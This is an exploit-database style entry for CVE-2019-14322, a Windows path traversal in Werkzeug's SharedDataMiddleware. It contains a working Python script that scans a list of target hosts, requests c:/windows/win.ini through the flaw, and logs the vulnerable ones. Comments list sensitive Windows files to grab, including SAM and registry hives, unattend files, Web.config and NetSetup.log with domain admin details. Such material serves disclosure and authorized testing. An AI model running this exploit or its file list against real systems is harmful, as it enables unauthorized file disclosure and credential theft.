# Exploit Title: Pallets Werkzeug 0.15.4 - Path Traversal
# Date: 06 July 2021
# Original Author: Emre ÖVÜNÇ
# Exploit Author: faisalfs10x (https://github.com/faisalfs10x)
# Vendor Homepage: https://palletsprojects.com/
# Software Link: https://github.com/pallets/werkzeug
# Version: Prior to 0.15.5
# Tested on: Windows Server
# CVE: 2019-14322
# Credit: Emre Övünç and Olivier Dony for responsibly reporting the issue
# CVE Link: https://nvd.nist.gov/vuln/detail/CVE-2019-14322
# Reference : https://palletsprojects.com/blog/werkzeug-0-15-5-released/

Description : Prior to 0.15.5, it was possible for a third party to potentially access arbitrary files when the application used SharedDataMiddleware on Windows. Due to the way Python's os.path.join() function works on Windows, a path segment with a drive name will change the drive of the final path. TLDR; In Pallets Werkzeug before 0.15.5, SharedDataMiddleware mishandles drive names (such as C:) in Windows pathnames lead to arbitrary file download.

#!/usr/bin/env python3
# PoC code by @faisalfs10x [https://github.com/faisalfs10x]

""" $ pip3 install colorama==0.3.3, argparse, requests, urllib3
    $ python3 CVE-2019-14322.py -l list_target.txt"
"""
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import requests
from colorama import Fore, Back, Style, init

# Colors
red = '\033[91m'
green = '\033[92m'
white = '\033[97m'
yellow = '\033[93m'
bold = '\033[1m'
end = '\033[0m'

init(autoreset=True)

def banner_motd():
    print(Fore.CYAN +Style.BRIGHT +"""

        CVE-2019-14322 %sPoC by faisalfs10x%s - (%s-%s)%s %s
""" % (bold, red, white, yellow, white, end))

banner_motd()

# list of sensitive files to grab in windows

# %windir%\repair\sam
# %windir%\System32\config\RegBack\SAM
# %windir%\repair\system
# %windir%\repair\software
# %windir%\repair\security
# %windir%\debug\NetSetup.log (AD domain name, DC name, internal IP, DA account)
# %windir%\iis6.log (5,6 or 7)
# %windir%\system32\logfiles\httperr\httperr1.log
# C:\sysprep.inf
# C:\sysprep\sysprep.inf
# C:\sysprep\sysprep.xml
# %windir%\Panther\Unattended.xml
# C:\inetpub\wwwroot\Web.config
# %windir%\system32\config\AppEvent.Evt (Application log)
# %windir%\system32\config\SecEvent.Evt (Security log)
# %windir%\system32\config\default.sav
# %windir%\system32\config\security.sav
# %windir%\system32\config\software.sav
# %windir%\system32\config\system.sav
# %windir%\system32\inetsrv\config\applicationHost.config
# %windir%\system32\inetsrv\config\schema\ASPNET_schema.xml
# %windir%\System32\drivers\etc\hosts (dns entries)
# %windir%\System32\drivers\etc\networks (network settings)
# %windir%\system32\config\SAM
# TLDR:
# C:/windows/system32/inetsrv/config/schema/ASPNET_schema.xml
# C:/windows/system32/inetsrv/config/applicationHost.config
# C:/windows/system32/logfiles/httperr/httperr1.log
# C:/windows/debug/NetSetup.log - (may contain AD domain name, DC name, internal IP, DA account)
# C:/windows/system32/drivers/etc/hosts - (dns entries)
# C:/windows/system32/drivers/etc/networks - (network settings)

def check(url):

	# There are 3 endpoints to be tested by default, but to avoid noisy, just pick one :)
	for endpoint in [
			'https://{}/base_import/static/c:/windows/win.ini',
			#'https://{}/web/static/c:/windows/win.ini',
			#'https://{}/base/static/c:/windows/win.ini'
			]:
		try:

			url2 = endpoint.format(url)
			resp = requests.get(url2, verify=False, timeout=5)

			if 'fonts' and 'files' and 'extensions' in resp.text:
				print(Fore.LIGHTGREEN_EX +Style.BRIGHT +" [+] " +url2+ " : vulnerable====[+]")
				with open('CVE-2019-14322_result.txt', 'a+') as output:
					output.write('{}\n'.format(url2))
					output.close()

			else:
				print(" [-] " +url+ " : not vulnerable")

		except KeyboardInterrupt:
			exit('User aborted!')
		except:
			print(" [-] " +url+ " : not vulnerable")


def main(args):

    f = open(listfile, "r")
    for w in f:
        url = w.strip()

        check(url)

if __name__ == '__main__':

    try:

        parser = argparse.ArgumentParser(description='CVE-2019-14322')
        parser.add_argument("-l","--targetlist",required=True, help = "target list in file")
        args = parser.parse_args()
        listfile = args.targetlist

        main(args)

    except KeyboardInterrupt:
        exit('User aborted!')